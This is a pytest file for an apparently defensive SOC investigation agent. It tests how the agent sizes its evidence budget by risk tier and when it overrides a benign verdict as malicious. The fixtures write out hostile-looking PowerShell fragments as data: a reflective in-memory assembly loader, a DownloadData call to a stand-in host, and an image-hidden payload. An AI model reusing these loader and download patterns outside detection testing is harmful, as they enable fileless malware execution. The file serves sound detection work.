"""V21: bounded information gain and execution evidence, not benchmark answers."""
import asyncio

from bluesec1_agent.agent import InvestigationMemory, SimpleSGRAgent
from bluesec1_agent.investigation_director import InvestigationDirector
from bluesec1_agent.soc_v19 import SOCV19
from bluesec1_agent.soc_v21 import RiskAdaptiveCaseState, corroborated_submission
from test_v16_loop import FakeSession, finish


def state():
    return RiskAdaptiveCaseState(SOCV19(InvestigationDirector()))


def mem():
    m = InvestigationMemory()
    m.focus_ids = {'ps'}
    m.absorb({'id': 'ps', 'type': 'windows_process',
              'properties': {'cmdline': 'powershell.exe -NoProfile -File script.ps1'}})
    m.fetched_ids.add('ps')
    return m


def test_baseline_stays_bounded_and_no_synthetic_unknown_ids():
    m=mem(); s=state(); p=s.risk_profile(m)
    assert p.tier=='baseline' and p.minimum == 6
    assert s.select_acquisition(m,{'get_relation'},step_index=2,max_steps=25) is None


def test_remote_attribution_receives_larger_budget():
    m=mem()
    m.absorb({'id':'rel','type':'accepted_connection_from','source_id':'ps','target_id':'net'})
    p=state().risk_profile(m)
    assert p.tier=='attribute' and p.minimum>6 and p.maximum<=15


def test_remote_context_from_fetched_wsmprovhost_before_edge():
    m=mem()
    m.absorb({'id':'ps','type':'windows_process','properties':{'cmdline':'wsmprovhost.exe -Embedding'}})
    assert state().risk_profile(m).minimum>=9


def test_high_priority_security_case_gets_more_checks_than_remote():
    m=mem()
    m.absorb({'id':'file','type':'windows_file',
              'properties':{'path':r'C:\Users\Public\AppData\Roaming\launcher.exe'}})
    m.absorb({'id':'write','type':'wrote_file','source_id':'ps','target_id':'file'})
    risk=state().risk_profile(m)
    assert risk.tier=='corroborate' and risk.minimum>=10


def add_memory_loader(m, *, image=True, graph=True, invoked=True):
    cmd=('[Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)' if invoked
         else '[Reflection.Assembly]::Load($data)')
    if image:cmd='System.Drawing.Bitmap("payload.png");'+cmd
    else:cmd='$wc.DownloadData("https://example.test/x");'+cmd
    m.absorb({'id':'ps','type':'windows_process','properties':{'cmdline_decoded':cmd}})
    if graph:
        m.absorb({'id':'exec','type':'executed_script','source_id':'ps','target_id':'script'})
        m.absorb({'id':'script','type':'powershell_script','properties':{'script_text':'hello'}})
        m.fetched_ids.update({'exec','script'})


def test_proven_image_loader_overrules_unsupported_benign():
    m=mem();add_memory_loader(m)
    sub={'verdict':'benign','legitimacy_evidence':[],
         'reasoning':'Signed Microsoft script so it is probably safe'}
    output=corroborated_submission(m,state().engine,sub)
    assert output and output['verdict']=='malicious'
    assert {a['entity_id'] for a in output['ir_artifacts']}.issubset(m.observed_nodes)
    assert 'image' in output['reasoning']


def test_proven_remote_loader_requires_linked_real_effect():
    m=mem();add_memory_loader(m,image=False)
    result=corroborated_submission(m,state().engine,{'verdict':'benign'})
    assert result and 'downloaded bytes' in result['reasoning']


def test_unfetched_script_or_missing_execution_never_overrides():
    m=mem();add_memory_loader(m,graph=False)
    assert corroborated_submission(m,state().engine,{'verdict':'benign'}) is None
    m=mem();add_memory_loader(m,invoked=False)
    assert corroborated_submission(m,state().engine,{'verdict':'benign'}) is None
    m=mem();add_memory_loader(m);m.fetched_ids.remove('ps')
    assert corroborated_submission(m,state().engine,{'verdict':'benign'}) is None


def test_generic_encoded_command_is_not_auto_attack():
    m=mem(); m.absorb({'id':'ps','type':'windows_process',
                       'properties':{'cmdline':'powershell -EncodedCommand aGVsbG8='}})
    assert corroborated_submission(m,state().engine,{'verdict':'benign'}) is None


def test_non_benign_submission_is_never_changed():
    m=mem();add_memory_loader(m)
    assert corroborated_submission(m,state().engine,{'verdict':'malicious'}) is None


def test_full_agent_phase_uses_actual_graph_and_does_not_duplicate_audits():
    class LLM:
        def __init__(self):self.calls=[]
        async def next_step(self,messages,*,finish_only=False):
            self.calls.append(finish_only)
            return finish()
    session=FakeSession();llm=LLM();transcript=[]
    agent=SimpleSGRAgent(llm,max_steps=12,trajectory_dir=None,review_enabled=True,
                         gpt_oss_mode=True,soc_v21_mode=True)
    result=asyncio.run(agent._investigate(session,transcript))
    assert result.completion_reason=='terminated'
    assert [name for name,_ in session.calls][:3]==['get_entity','get_relation','get_entity']
    assert all(llm.calls) and sum('blind_review' in str(x) for x in transcript)==1
    assert any('v21_risk_tier' in str(x) for x in transcript)


def test_previous_modes_unchanged():
    a=SimpleSGRAgent(object(),soc_v20_mode=True)
    assert a.soc_v20_mode and not a.soc_v21_mode
    b=SimpleSGRAgent(object(),soc_v21_mode=True)
    assert b.soc_v20_mode and b.soc_v21_mode
